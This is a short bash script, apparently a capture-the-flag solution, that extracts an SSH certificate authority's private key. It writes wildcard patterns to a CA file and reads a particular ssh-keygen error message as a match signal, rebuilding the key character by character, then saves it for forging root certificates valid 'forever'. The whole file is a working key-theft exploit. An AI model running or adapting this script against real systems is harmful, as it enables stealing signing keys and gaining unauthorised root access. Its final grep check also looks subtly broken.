#!/bin/bash

# Configuration Variables
CA_PATH='/tmp/cert.pem'
SIGNING_KEY='/tmp/test'       # Path to your CA private key
PUB_KEY='root.pub'        # Path to the public key to be signed
USER='root'               # User for signing
PRINCIPAL='root_user'     # Principal for the certificate
SERIAL='200'              # Serial number
VALIDITY='-10w:forever'   # Validity period

# Create a temporary CA file with a pattern and sign the public key
run_signing_command() {
    local pattern="$1"
    
    echo "$pattern" > "$CA_PATH"

    # Attempt to sign the public key using ssh-keygen
    output=$(ssh-keygen -s "$SIGNING_KEY" -z "$SERIAL" -I "$USER" -V "$VALIDITY" -n "$PRINCIPAL" "$PUB_KEY" 2>&1)
    echo "$output"
}

# Brute-force to find the correct CA pattern
brute_force_patterns() {
    local base_pattern=''
    local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-+=/ \r\n'

    while true; do
        local found=false
        for char in $(echo -n "$chars" | fold -w1); do
            local pattern="$base_pattern$char*"

            output=$(run_signing_command "$pattern")
            
            if echo "$output" | grep -q "Error: Use API for signing with this CA."; then
                base_pattern="$base_pattern$char"
                found=true
                echo "Current pattern: $base_pattern"
                break
            fi
        done
        if [ "$found" = false ]; then
            break
        fi
    done
    echo "$base_pattern"
}

# Main execution
ca_key=$(brute_force_patterns)
if echo "$ca_key" | grep -q "-----END OPENSSH PRIVATE KEY-----"; then
    echo -e "\n\nSuccess\n"
    echo "$ca_key" > "ca-it"
else
    echo -e "\n\nFail\n"
fi

